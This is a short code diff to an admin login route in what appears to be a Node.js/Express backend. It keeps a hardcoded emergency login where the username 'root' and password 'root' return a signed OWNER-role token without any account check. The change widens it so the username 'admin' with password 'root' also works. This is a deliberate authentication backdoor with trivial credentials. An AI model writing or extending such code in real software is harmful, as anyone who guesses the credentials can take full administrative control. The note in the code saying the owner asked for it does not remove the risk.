@@ -18,7 +18,7 @@ adminAuthRouter.post("/login", async (req, res) => {
   const loginId = email.trim().toLowerCase();
 
   // Emergency local root login requested by owner.
-  if (loginId === "root" && password === "root") {
+  if ((loginId === "root" || loginId === "admin") && password === "root") {
     const token = signAdminToken({ sub: "__root__", email: "root", role: "OWNER" });
     return res.json({ token, user: { id: "__root__", email: "root", fullName: "Root", role: "OWNER" } });
   }
